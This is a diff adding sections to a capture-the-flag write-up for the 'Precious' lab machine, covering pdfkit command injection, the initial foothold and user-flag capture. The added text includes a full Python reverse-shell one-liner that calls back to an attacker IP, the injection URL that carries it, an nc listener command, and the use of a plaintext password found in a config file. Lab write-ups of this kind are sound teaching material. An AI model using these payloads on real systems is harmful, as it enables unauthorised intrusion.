@@ -50,17 +50,71 @@ At this stage I do a bit of research into Phusion Passenger and pdfkit for any k
 
 > Command injection is listed as A03:Injection on the OWASP Top 10 list of web vulnerabilities. Basically, this vulnerability type allows an attacker to execute code on the system. OS command injection, which is what is exploitable on this machine, is when you are able to run commands that the actual OS behind the web service. This means that an attacker is able to access the server because the web server interprets requests made to it as commands for the system and not queries that run on the application that the user is interacting with. This can be due to poor practices in securing code by leaving user input unsanitised. Or it may be that functions and methods are used that are known to be vulnerable to this kind of attack. 
 
-In the case of Precious, pdfkit has a critical vulnerability that allows an attacker to remotely execute arbitrary code on the host OS. In terms of complexity, this attack is not that complex as it requires you to query the server at the end of your uri source e.g. `http://[ip]/%20'[command]'` ➡️ `http://10.10.14.19/%20'whoami'` 
+In the case of Precious, pdfkit has a critical vulnerability that allows an attacker to remotely execute arbitrary code on the host OS. In terms of complexity, this attack is not that complex as it requires you to query the server at the end of your uri source e.g. `http://[ip]/%20'[command]'` ➡️ `http://10.10.14.19/%20'whoami'` See the screenshot below.
 
 <p>
 <img src="" height="80%" width="80%" alt=""/>
 </p>
 
+Since we've been running our python3 server to pull data for the pdf we can observe the requests there. I tried to use Burpsuite to view responses but it wouldn't list out the responses as clearly as in the CLI. I enter what is shown in the above screenshot and recieved an error on the web page but in my server I received the response of the server disclosing the id of the user running the server. In this case it's "Ruby". "Ruby" has the UID of 1001 which means that there's another created user (as a opposed to root) on the server.
+
+<p>
+<img src="" height="80%" width="80%" alt=""/>
+</p>
 
 # Initial Foothold
 
+Now that we've established a proof-of-concept that we can execute commands on the system, we can now try to get an initial foothold. We will need to execute a reverse shell using the POC above. To do so I used one of the reverse shell codes found on **0xdedinfosec's** walkthrough. 
+
+> `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("XX.XX.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
+
+Where you see `XX.XX.XX.XX` this will need to be changed to the attacker's IP address. This code utilizes python3 to call back to the attackers machine and make a shell for us to move around the file system with. So, the full query will look like this:
+
+> http://10.10.XX.XX/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
+
+After setting up a listener using `nc -lvnp 9001`, I execute the command and get a shell!
+
+<p>
+<img src="" height="80%" width="80%" alt=""/>
+</p>
+
+I check `whoami` and get "ruby" back. I then use `/bin/bash -i` to stabilize the shell.
+
+<p>
+<img src="" height="80%" width="80%" alt=""/>
+</p>
+
+<p>
+<img src="" height="80%" width="80%" alt=""/>
+</p>
+
+I have a look arond the file system. I go to the home directory of "ruby" trying to look for a clue but find nothing at this point. I remember that there's probably another user on this system so I check the `/home` directory and find `user.txt`. I try to read it but I get a permission denied. This means that I need to find a way to elevate my privileges.
+
+<p>
+<img src="" height="80%" width="80%" alt=""/>
+</p>
+
+I keep looking around the file system for a while. Eventually I return to "ruby's" home directory and start going through each hidden directory there. When I cat the `config` file of the `.bundle` directory we get this:
+
+<p>
+<img src="" height="80%" width="80%" alt=""/>
+</p>
+
+It appears that henry's password is saved in plain text here or in some sort of encoding. I decide to try it out and ssh into the system as henry. and it works!!
+
+<p>
+<img src="" height="80%" width="80%" alt=""/>
+</p>
+
+Now we are able to `cat user.txt` and get the flag!!
+
+<p>
+<img src="" height="80%" width="80%" alt=""/>
+</p>
 
 # Privilege Escalation
+
+
 
 ## YAML Deserialization
 
